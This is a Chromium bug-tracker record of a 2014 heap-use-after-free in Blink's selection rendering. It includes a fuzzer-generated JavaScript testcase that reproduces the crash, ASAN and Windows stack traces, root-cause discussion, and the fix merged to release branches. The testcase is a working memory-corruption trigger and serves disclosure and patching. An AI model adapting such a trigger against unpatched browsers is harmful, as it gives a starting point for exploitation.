# Heap-use-after-free in WebCore::RenderObject::childAt

| Field | Value |
|-------|-------|
| **Issue ID** | [40079201](https://issues.chromium.org/issues/40079201) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Layout |
| **Reporter** | cl...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2014-03-26 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the current ASAN build

**REPRODUCTION CASE**

<script>
function start() {
try{o0=tmp=document.createElement('iframe');;}catch(e){}
try{document.body.appendChild(tmp);}catch(e){}
try{o3=document.getElementById('fuzz\_div');}catch(e){}
try{o10=document.documentElement;}catch(e){}
try{o24=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');;}catch(e){}
try{o10.appendChild(o24)}catch(e){}
try{o26=o24.contentDocument;}catch(e){}
window.setTimeout('window.start\_scriptiframe0()',100);
}
function start\_scriptiframe0() {
try{o31=o0.contentDocument;}catch(e){}
try{o32=o31.documentElement;;}catch(e){}
try{o35=o24.contentWindow.document;}catch(e){}
try{o3.appendChild(o32);}catch(e){}
try{o74=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');;}catch(e){}
try{o32.appendChild(o74)}catch(e){}
try{o76=window.getSelection();}catch(e){}
try{o76.selectAllChildren(o74)}catch(e){}
try{o80=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');;}catch(e){}
try{o3.appendChild(o80)}catch(e){}
try{o3.contentEditable=true;}catch(e){}
try{document.execCommand('selectall',false,null);}catch(e){}
try{document.execCommand('createLink',false,'url(file:/)');}catch(e){}
try{o122=tmp=o3.ownerDocument.createElement('iframe');;}catch(e){}
try{o123=tmp;}catch(e){}
try{o35.write('\'element1>')}catch(e){}
try{document.execCommand('undo',false,null);}catch(e){}
try{o196=o26.documentElement;}catch(e){}
try{o196.appendChild(o80);}catch(e){}
try{o80.appendChild(o123);}catch(e){}
try{o301=o122.ownerDocument;}catch(e){}
try{o301.execCommand('redo',false,null);}catch(e){}
try{o301.execCommand('insertorderedlist',false,null);}catch(e){}
}
</script>
<body onload="start()"><div id="fuzz\_div"></div></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: ASAN output attached in debug.txt

## Attachments

- [debug.txt](attachments/debug.txt) (text/plain, 13.8 KB)

## Timeline

### cl...@chromium.org (2014-03-26)

ClusterFuzz is analyzing your testcase. See https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

### in...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### jw...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-26)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

Uploader: jww@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000095400
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::Text::updateTextRenderer
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=237776:237788

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rPLVmnM6Eaur3sBr_vGsAGijlT0gnIFcpcHk2ytvY37SSiuVRhQTnH_GXW6SgxAI4EFBNNMf55QIiVgRGJ5QS-ttyV2F9J8MBv0cq1dnCaaCO9cTWVn9u1jTzrOQ4bv5FCrEILWfkafqUgNMYUkvpQirFnw



### cl...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-03-26)

looks like regression from http://src.chromium.org/viewvc/blink?view=rev&revision=162817

### cl...@chromium.org (2014-03-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-04-04)

yosin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

Uploader: jww@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000095400
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::Text::updateTextRenderer
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=237776:237788

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rPLVmnM6Eaur3sBr_vGsAGijlT0gnIFcpcHk2ytvY37SSiuVRhQTnH_GXW6SgxAI4EFBNNMf55QIiVgRGJ5QS-ttyV2F9J8MBv0cq1dnCaaCO9cTWVn9u1jTzrOQ4bv5FCrEILWfkafqUgNMYUkvpQirFnw



### in...@chromium.org (2014-04-09)

http://src.chromium.org/viewvc/blink?view=rev&revision=162817 is only changeset in regression range.

Yosin@, this is a high severity regression from your change. Please take a look or revert it soon [i was getting conflicts when reverting].



### yo...@chromium.org (2014-04-10)

Looking...

### yo...@chromium.org (2014-04-10)

I could re-produce on "Stable 33.0.1750.154 (Official Build 257193) m"
However,  could not re-produce on ToT content_shell and chrome.
Trying ToT Linux ASAN.

### in...@chromium.org (2014-04-10)

On clusterfuzz, it does reproduce on trunk. please try with linux asan with same command line switches in report.

### yo...@chromium.org (2014-04-10)

Ok, I could re-produce on Linux-ASAN.

Operating system: Linux
                  0.0.0 Linux 3.2.5-gg1336 #1 SMP Thu Aug 29 02:37:18 PDT 2013 x86_64
CPU: amd64
     family 6 model 44 stepping 2
     12 CPUs

Crash reason:  0x00000000 / 0x00000000
Crash address: 0x6

Thread 0 (crashed)
 0  content_shell!SimulateSignalDelivery [exception_handler.cc : 431 + 0x0]
    rbx = 0x00007fffc4a40be0   r12 = 0x00007fffc4a40c80
    r13 = 0x00000ffff8948178   r14 = 0x000060c0000ac000
    r15 = 0x00007fffc4a40bc0   rip = 0x0000000000625059
    rsp = 0x00007fffc4a40bc0   rbp = 0x00007fffc4a41120
    Found by: given as instruction pointer in context
 1  content_shell!~ScopedInErrorReport [asan_report.cc : 564 + 0x9]
    rbx = 0x00007fffc4a41a30   r12 = 0x000000000064dee2
    r13 = 0x000000000065586d   r14 = 0x0000000000654aad
    r15 = 0x0000000000655860   rip = 0x00000000004a991a
    rsp = 0x00007fffc4a41130   rbp = 0x00007fffc4a41a30
    Found by: call frame info
 2  content_shell!__asan_report_error [asan_report.cc : 859 + 0x5]
    rbx = 0x00007fffc4a41a30   r12 = 0x000000000064dee2
    r13 = 0x000000000065586d   r14 = 0x0000000000654aad
    r15 = 0x0000000000655860   rip = 0x00000000004a9492
    rsp = 0x00007fffc4a41140   rbp = 0x00007fffc4a41a30
    Found by: call frame info
 3  content_shell!__asan_report_load8 [asan_rtl.cc : 356 + 0x1c]
    rbx = 0x000000000000000b   r12 = 0x00006120002fbfc0
    r13 = 0x000060c0000b2840   r14 = 0x00007fffc4a41c80
    r15 = 0x000000000000000b   rip = 0x00000000004aa087
    rsp = 0x00007fffc4a41a80   rbp = 0x00007fffc4a41a90
    Found by: call frame info
 4  libblink_web.so!childAt [RenderObject.h : 183 + 0x5]
    rbx = 0x000000000000000b   r12 = 0x00006120002fbfc0
    r13 = 0x000060c0000b2840   r14 = 0x00007fffc4a41c80
    r15 = 0x000000000000000b   rip = 0x00007fe4bc40fb6e
    rsp = 0x00007fffc4a41aa0   rbp = 0x00007fffc4a41ab0
    Found by: call frame info
 5  libblink_web.so!setSelection [RenderView.cpp : 507 + 0xb]
    rbx = 0x000060c0000aff00   r12 = 0x00006120002fbfc0
    r13 = 0x000060c0000b2840   r14 = 0x00007fffc4a41c80
    r15 = 0x000000000000000b   rip = 0x00007fe4bc526db5
    rsp = 0x00007fffc4a41ac0   rbp = 0x00007fffc4a42130
    Found by: call frame info
 6  libblink_web.so!updateAppearance [FrameSelection.cpp : 1589 + 0x15]
    rbx = 0x000060c0000b2840   r12 = 0x00007fffc4a422c0
    r13 = 0x0000000000000000   r14 = 0x00007fffc4a42400
    r15 = 0x00007fffc4a42400   rip = 0x00007fe4bb91411c
    rsp = 0x00007fffc4a42140   rbp = 0x00007fffc4a42510
    Found by: call frame info
 7  libblink_web.so!setSelection [FrameSelection.cpp : 274 + 0x8]
    rbx = 0x00007fffc4a42640   r12 = 0x0000000000000000
    r13 = 0x00007fffc4a42740   r14 = 0x00007fffc4a42760
    r15 = 0x00006120002fc440   rip = 0x00007fe4bb90d3ef
    rsp = 0x00007fffc4a42520   rbp = 0x00007fffc4a427f0
    Found by: call frame info
 8  libblink_web.so!changeSelectionAfterCommand [Editor.cpp : 1036 + 0xb]
    rbx = 0x00007fffc4a42800   r12 = 0x00007fffc4a428e0
    r13 = 0x00000c1a00014df8   r14 = 0x00006070000a5e00
    r15 = 0x000060d0000a6fc0   rip = 0x00007fe4bb8eae47
    rsp = 0x00007fffc4a42800   rbp = 0x00007fffc4a42830
    Found by: call frame info
 9  libblink_web.so!appliedEditing [Editor.cpp : 694 + 0xb]
    rbx = 0x00007fffc4a428e0   r12 = 0x00007fffc4a42a20
    r13 = 0x000060d0000a6fc0   r14 = 0x00007fffc4a42880
    r15 = 0x00000ffff8948544   rip = 0x00007fe4bb8e9a86
    rsp = 0x00007fffc4a42840   rbp = 0x00007fffc4a429d0
    Found by: call frame info
10  libblink_web.so!apply [CompositeEditCommand.cpp : 199 + 0x8]
    rbx = 0x00007fffc4a42a20   r12 = 0x000061600052a3a8
    r13 = 0x00006110002f1b00   r14 = 0x00007fffc4a42a00
    r15 = 0x00000ffff8948544   rip = 0x00007fe4bb85e7ed
    rsp = 0x00007fffc4a429e0   rbp = 0x00007fffc4a42a90
    Found by: call frame info
11  libblink_web.so!executeInsertOrderedList [EditorCommand.cpp : 546 + 0x8]
    rbx = 0x00000c220005e361   r12 = 0x00007fffc4a42bb0
    r13 = 0x00000ffff8948575   r14 = 0x00006110002f1b00
    r15 = 0x00006110002f1b0c   rip = 0x00007fe4bb8fd73d
    rsp = 0x00007fffc4a42aa0   rbp = 0x00007fffc4a42ac0
    Found by: call frame info
12  libblink_web.so!execute [EditorCommand.cpp : 1687 + 0x29]
    rbx = 0x00007fe4bb8fd6d0   r12 = 0x00007fffc4a42bb0
    r13 = 0x00000ffff8948575   r14 = 0x00000ffff8948574
    r15 = 0x00007fffc4a42e20   rip = 0x00007fe4bb8f872a
    rsp = 0x00007fffc4a42ad0   rbp = 0x00007fffc4a42b10
    Found by: call frame info
13  libblink_web.so!execCommand [Document.cpp : 4221 + 0xb]
    rbx = 0x000061600052a3a8   r12 = 0x00007fffc4a42ba0
    r13 = 0x000061e000037880   r14 = 0x00007fffc4a42e20
    r15 = 0x00000ffff8948568   rip = 0x00007fe4ba9bad82
    rsp = 0x00007fffc4a42b20   rbp = 0x00007fffc4a42c30
    Found by: call frame info
14  libblink_web.so!execCommandMethodCallback [V8Document.cpp : 4874 + 0x15]
    rbx = 0x00007fffc4a42e00   r12 = 0x00000ffff89485b9
    r13 = 0x00000ffff89485b8   r14 = 0x00007fffc4a42f40
    r15 = 0x00007fffc4a42e20   rip = 0x00007fe4b9e2d9e5
    rsp = 0x00007fffc4a42c40   rbp = 0x00007fffc4a42e90
    Found by: call frame info
15  libv8.so!Call [arguments.cc : 56 + 0x3]
    rbx = 0x000062c000000200   r12 = 0x00007fffc4a42ee0
    r13 = 0x00007fffc4a42f00   r14 = 0x00000ffff89485e2
    r15 = 0x00007fffc4a430c0   rip = 0x00007fe4c16819fc
    rsp = 0x00007fffc4a42ea0   rbp = 0x00007fffc4a42fd0
    Found by: call frame info
16  libv8.so!Builtin_HandleApiCall [builtins.cc : 1221 + 0xd]
    rbx = 0x000062c000000258   r12 = 0x000062c000000200
    r13 = 0x00007fffc4a430c0   r14 = 0x00000c580000004b
    r15 = 0x00000ffff894861e   rip = 0x00007fe4c16e04a1
    rsp = 0x00007fffc4a42fe0   rbp = 0x00007fffc4a431a0
    Found by: call frame info
17  0x7fe48030634e
    rbx = 0x00007fe4c16dfcd0   r12 = 0x0000000100000000
    r13 = 0x000062c0000002a8   r14 = 0x0000000000000003
    r15 = 0x00007fffc4a431e0   rip = 0x00007fe48030634e
    rsp = 0x00007fffc4a431b0   rbp = 0x00007fffc4a431c0
    Found by: call frame info


### yo...@chromium.org (2014-04-10)

I could also re-produce this on Windows content_shell.exe with syzyasan=1

Here is stack trace:

blink_web.dll!WebCore::RenderObject::firstChild() Line 183 C++
blink_web.dll!WebCore::RenderObject::childAt(unsigned int index) Line 405 C++
blink_web.dll!WebCore::rendererAfterPosition(WebCore::RenderObject * object, unsigned int offset) Line 507 C++
blink_web.dll!WebCore::RenderView::setSelection(WebCore::RenderObject * start, int startPos, WebCore::RenderObject * end, int endPos, WebCore::RenderView::SelectionRepaintMode blockRepaintMode) Line 629 C++
blink_web.dll!WebCore::FrameSelection::updateAppearance() Line 1591 C++
blink_web.dll!WebCore::FrameSelection::setSelection(const WebCore::VisibleSelection & newSelection, unsigned int options, WebCore::FrameSelection::CursorAlignOnScroll align, WebCore::TextGranularity granularity) Line 275 C++
blink_web.dll!WebCore::Editor::changeSelectionAfterCommand(const WebCore::VisibleSelection & newSelection, unsigned int options) Line 1045 C++
blink_web.dll!WebCore::Editor::appliedEditing(WTF::PassRefPtr<WebCore::CompositeEditCommand> cmd) Line 696 C++
blink_web.dll!WebCore::CompositeEditCommand::apply() Line 200 C++
blink_web.dll!WebCore::executeInsertOrderedList(WebCore::LocalFrame & frame, WebCore::Event * __formal, WebCore::EditorCommandSource __formal, const WTF::String & __formal) Line 546 C++
blink_web.dll!WebCore::Editor::Command::execute(const WTF::String & parameter, WebCore::Event * triggeringEvent) Line 1687 C++
blink_web.dll!WebCore::Document::execCommand(const WTF::String & commandName, bool userInterface, const WTF::String & value) Line 4214 C++
blink_web.dll!WebCore::DocumentV8Internal::execCommandMethod(const v8::FunctionCallbackInfo<v8::Value> & info) Line 4874 C++
blink_web.dll!WebCore::DocumentV8Internal::execCommandMethodCallback(const v8::FunctionCallbackInfo<v8::Value> & info) Line 4880 C++
v8.dll!v8::internal::FunctionCallbackArguments::Call(void (const v8::FunctionCallbackInfo<v8::Value> &) * f) Line 57 C++
v8.dll!v8::internal::HandleApiCallHelper<0>(v8::internal::`anonymous-namespace'::BuiltinArguments<1> args, v8::internal::Isolate * isolate) Line 1222 C++
v8.dll!v8::internal::Builtin_HandleApiCall(int args_length, v8::internal::Object * * args_object, v8::internal::Isolate * isolate) Line 1237 C++
[External Code] 
[Frames below may be incorrect and/or missing] 
v8.dll!v8::internal::Invoke(bool is_construct, v8::internal::Handle<v8::internal::JSFunction> function, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * args, bool * has_pending_exception) Line 95 C++
v8.dll!v8::internal::Execution::Call(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::Object> callable, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv, bool * pending_exception, bool convert_receiver) Line 155 C++
v8.dll!v8::Function::Call(v8::Handle<v8::Value> recv, int argc, v8::Handle<v8::Value> * argv) Line 4007 C++
blink_web.dll!WebCore::V8ScriptRunner::callFunction(v8::Handle<v8::Function> function, WebCore::ExecutionContext * context, v8::Handle<v8::Value> receiver, int argc, v8::Handle<v8::Value> * args, v8::Isolate * isolate) Line 140 C++
blink_web.dll!WebCore::ScriptController::callFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Function> function, v8::Handle<v8::Value> receiver, int argc, v8::Handle<v8::Value> * info, v8::Isolate * isolate) Line 171 C++
blink_web.dll!WebCore::ScriptController::callFunction(v8::Handle<v8::Function> function, v8::Handle<v8::Value> receiver, int argc, v8::Handle<v8::Value> * info) Line 143 C++
blink_web.dll!WebCore::V8EventListener::callListenerFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Value> jsEvent, WebCore::Event * event) Line 93 C++
blink_web.dll!WebCore::V8AbstractEventListener::invokeEventHandler(WebCore::ExecutionContext * context, WebCore::Event * event, v8::Local<v8::Value> jsEvent) Line 126 C++
blink_web.dll!WebCore::V8AbstractEventListener::handleEvent(WebCore::ExecutionContext * context, WebCore::Event * event) Line 93 C++
blink_web.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event, WebCore::EventTargetData * d, WTF::Vector<WebCore::RegisteredEventListener,1,WTF::DefaultAllocator> & entry) Line 331 C++
blink_web.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event) Line 274 C++
blink_web.dll!WebCore::DOMWindow::dispatchEvent(WTF::PassRefPtr<WebCore::Event> prpEvent, WTF::PassRefPtr<WebCore::EventTarget> prpTarget) Line 1605 C++
blink_web.dll!WebCore::DOMWindow::dispatchLoadEvent() Line 1576 C++
blink_web.dll!WebCore::DOMWindow::dispatchWindowLoadEvent() Line 327 C++
blink_web.dll!WebCore::DOMWindow::documentWasClosed() Line 444 C++
blink_web.dll!WebCore::Document::implicitClose() Line 2474 C++
blink_web.dll!WebCore::FrameLoader::checkCompleted() Line 470 C++
blink_web.dll!WebCore::FrameLoader::finishedParsing() Line 400 C++
blink_web.dll!WebCore::Document::finishedParsing() Line 4486 C++
blink_web.dll!WebCore::HTMLConstructionSite::finishedParsing() Line 534 C++
blink_web.dll!WebCore::HTMLTreeBuilder::finished() Line 2785 C++
blink_web.dll!WebCore::HTMLDocumentParser::end() Line 788 C++
blink_web.dll!WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd() Line 799 C++
blink_web.dll!WebCore::HTMLDocumentParser::prepareToStopParsing() Line 222 C++
blink_web.dll!WebCore::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> popChunk) Line 472 C++
blink_web.dll!WebCore::HTMLDocumentParser::pumpPendingSpeculations() Line 505 C++
blink_web.dll!WebCore::HTMLDocumentParser::didReceiveParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> chunk) Line 345 C++
blink_web.dll!WTF::FunctionWrapper<void (__thiscall WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()(const WTF::WeakPtr<WebCore::HTMLDocumentParser> & c, WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> p1) Line 210 C++
blink_web.dll!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__thiscall WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>,void __cdecl(WTF::WeakPtr<WebCore::HTMLDocumentParser>,WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()() Line 421 C++
wtf.dll!WTF::Function<void __cdecl(void)>::operator()() Line 577 C++
wtf.dll!WTF::callFunctionObject(void * context) Line 63 C++
content.dll!base::internal::RunnableAdapter<void (__cdecl*)(void *)>::Run(void * const & a1) Line 171 C++
content.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__cdecl*)(void *)>,void __cdecl(void * const &)>::MakeItSo(base::internal::RunnableAdapter<void (__cdecl*)(void *)> runnable, void * const & a1) Line 872 C++
content.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__cdecl*)(void *)>,void __cdecl(void *),void __cdecl(void *)>,void __cdecl(void *)>::Run(base::internal::BindStateBase * base) Line 1169 C++
base.dll!base::Callback<void __cdecl(void)>::Run() Line 401 C++
base.dll!base::MessageLoop::RunTask(const base::PendingTask & pending_task) Line 451 C++
base.dll!base::MessageLoop::DeferOrRunPendingTask(const base::PendingTask & pending_task) Line 464 C++
base.dll!base::MessageLoop::DoWork() Line 575 C++
base.dll!base::MessagePumpForUI::DoRunLoop() Line 218 C++
base.dll!base::MessagePumpWin::RunWithDispatcher(base::MessagePump::Delegate * delegate, base::MessagePumpDispatcher * dispatcher) Line 65 C++
base.dll!base::MessagePumpWin::Run(base::MessagePump::Delegate * delegate) Line 47 C++
base.dll!base::MessageLoop::RunHandler() Line 399 C++
base.dll!base::RunLoop::Run() Line 50 C++
base.dll!base::MessageLoop::Run() Line 293 C++
base.dll!base::Thread::Run(base::MessageLoop * message_loop) Line 173 C++
base.dll!base::Thread::ThreadMain() Line 225 C++
base.dll!base::`anonymous namespace'::ThreadFunc(void * params) Line 78 C++
[External Code] 


### yo...@chromium.org (2014-04-10)

The root cause is RenderView::m_selectionStart and m_selectionEnd hold freed RenderText objects.

I'm looking for why this happen.

### yo...@chromium.org (2014-04-10)

When I added function RenderView::renderObjectWillBeDestroyed() to reset m_selection{Start,End} in RenderObject::willBeDestroyed(), but m_selection{Start,End} isn't reset. Because, m_selection{Start,End} are belong to different Frame.

RenderObject::willBeDestroyed() {
 ...
    if (RenderView* view = this->view())
        view->renderObjectwillBeDestroyed(this);
 ...
}

This situation is caused by |execCommand("redo")|.

### yo...@chromium.org (2014-04-11)

The root cause is |VisibleSelection::base()| and |VisbileSelection::start()| are in different documents.

In this test case, |VisibleSelection::base()| is "IFRAME" and VisibleSelection::start() is anchor text created by |execCommand("createLink")| which is in iframe of |VisibleSelection::base()|.

|FrameSelection::setSelection()| uses |VisibleSelection::base()| for checking whether new selection is for the frame of |FrameSeleciton| object. If it isn't frame associated to it, it calls another frame's |FrameSelection::setSelection|.


We use |VisibleSelection::start()| and |VisibleSelection::end()| for rendering selection. In this case, |VisibleSelection::start()| is in different frame.


### yo...@chromium.org (2014-04-11)

In review: https://codereview.chromium.org/234463003/

### cl...@chromium.org (2014-04-13)

ClusterFuzz has detected this issue as fixed in range 259530:259551.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

Uploader: jww@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000095400
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::Text::updateTextRenderer
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=237776:237788
Fixed: https://cluster-fuzz.appspot.com/revisions?range=259530:259551

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rPLVmnM6Eaur3sBr_vGsAGijlT0gnIFcpcHk2ytvY37SSiuVRhQTnH_GXW6SgxAI4EFBNNMf55QIiVgRGJ5QS-ttyV2F9J8MBv0cq1dnCaaCO9cTWVn9u1jTzrOQ4bv5FCrEILWfkafqUgNMYUkvpQirFnw

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### in...@chromium.org (2014-04-14)

ignore c#21, i don't think this is fixed.

### bu...@chromium.org (2014-04-14)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=171440

------------------------------------------------------------------
r171440 | yosin@chromium.org | 2014-04-14T08:24:16.561109Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/undo/crash-redo-with-iframes-expected.txt?r1=171440&r2=171439&pathrev=171440
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/FrameSelection.cpp?r1=171440&r2=171439&pathrev=171440
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/undo/crash-redo-with-iframes.html?r1=171440&r2=171439&pathrev=171440

Avoid using cross RenderView selection rendering

This patch makes sure we pass |RenderObject| belong to RenderView in
|RenderView::setSelection|, which takes two |RenderObject|s for start and end of
selection, in |FrameSeleciton::updateAppearance|.

The bug is caused by |VisibleSelection::base| and |VisibleSelection::start|
are in different document, |base| points to IFRAME and |start| points |TextNode|
in IFRAME. This causes |RenderView|, which holds |RenderObject|s of selection
start points and end points, have dangling |RenderObject|'s. Because,
|RenderView| doesn't know destructed |RenderObject| belongs to another
|RenderView|.

BUG=356690
TEST=LayoutTests/undo/execCommand/crash-redo-with-iframes.html

Review URL: https://codereview.chromium.org/234463003
-----------------------------------------------------------------

### in...@chromium.org (2014-04-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-04-14)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-14)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

Uploader: jww@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000095400
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::Text::updateTextRenderer
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=237776:237788

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rPLVmnM6Eaur3sBr_vGsAGijlT0gnIFcpcHk2ytvY37SSiuVRhQTnH_GXW6SgxAI4EFBNNMf55QIiVgRGJ5QS-ttyV2F9J8MBv0cq1dnCaaCO9cTWVn9u1jTzrOQ4bv5FCrEILWfkafqUgNMYUkvpQirFnw



### cl...@chromium.org (2014-04-15)

ClusterFuzz has detected this issue as fixed in range 259530:259551.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5161083719385088

Uploader: jww@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000095400
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::Text::updateTextRenderer
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=237776:237788
Fixed: https://cluster-fuzz.appspot.com/revisions?range=259530:259551

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94rPLVmnM6Eaur3sBr_vGsAGijlT0gnIFcpcHk2ytvY37SSiuVRhQTnH_GXW6SgxAI4EFBNNMf55QIiVgRGJ5QS-ttyV2F9J8MBv0cq1dnCaaCO9cTWVn9u1jTzrOQ4bv5FCrEILWfkafqUgNMYUkvpQirFnw

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### ti...@chromium.org (2014-04-22)

Merge Requested for M35.

### ti...@chromium.org (2014-04-22)

[Empty comment from Monorail migration]

### ka...@google.com (2014-04-22)

approved for m35 - 1916

### ti...@chromium.org (2014-04-23)

yosin@ - please merge into M35 (branch 1916).

### yo...@chromium.org (2014-04-23)

Merged http://src.chromium.org/viewvc/blink?view=revision&revision=172308

### bu...@chromium.org (2014-04-23)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=172308

------------------------------------------------------------------
r172308 | yosin@chromium.org | 2014-04-23T02:05:21.802718Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1916/Source/core/editing/FrameSelection.cpp?r1=172308&r2=172307&pathrev=172308
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/editing/undo/crash-redo-with-iframes.html?r1=172308&r2=172307&pathrev=172308
   A http://src.chromium.org/viewvc/blink/branches/chromium/1916/LayoutTests/editing/undo/crash-redo-with-iframes-expected.txt?r1=172308&r2=172307&pathrev=172308

Merge 171440 "Avoid using cross RenderView selection rendering"

> Avoid using cross RenderView selection rendering
> 
> This patch makes sure we pass |RenderObject| belong to RenderView in
> |RenderView::setSelection|, which takes two |RenderObject|s for start and end of
> selection, in |FrameSeleciton::updateAppearance|.
> 
> The bug is caused by |VisibleSelection::base| and |VisibleSelection::start|
> are in different document, |base| points to IFRAME and |start| points |TextNode|
> in IFRAME. This causes |RenderView|, which holds |RenderObject|s of selection
> start points and end points, have dangling |RenderObject|'s. Because,
> |RenderView| doesn't know destructed |RenderObject| belongs to another
> |RenderView|.
> 
> BUG=356690
> TEST=LayoutTests/undo/execCommand/crash-redo-with-iframes.html
> 
> Review URL: https://codereview.chromium.org/234463003

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/248583002
-----------------------------------------------------------------

### in...@chromium.org (2014-04-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-04-25)

Merge Requested for M34 Patch 2.

### ti...@chromium.org (2014-04-25)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-28)

dxie@ - can you please approve this merge? I know that for the M34 Patch 1 you were happy for me to Merge-Approve security bugs, but I think you should approve these for the audit trail. I'll make sure to nominate bugs for merging that shouldn't wait for M35.

### dx...@google.com (2014-04-29)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-30)

yosin@ - can you please merge this to branch 1847 as well? (in case we push another M34 release)

### ti...@chromium.org (2014-04-30)

[Empty comment from Monorail migration]

### yo...@chromium.org (2014-05-01)

Merged into branch 1847(M34):
http://src.chromium.org/viewvc/blink?view=rev&rev=173049

### bu...@chromium.org (2014-05-01)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=173049

------------------------------------------------------------------
r173049 | yosin@chromium.org | 2014-05-01T01:04:16.023742Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/1847/LayoutTests/editing/undo/crash-redo-with-iframes-expected.txt?r1=173049&r2=173048&pathrev=173049
   M http://src.chromium.org/viewvc/blink/branches/chromium/1847/Source/core/editing/FrameSelection.cpp?r1=173049&r2=173048&pathrev=173049
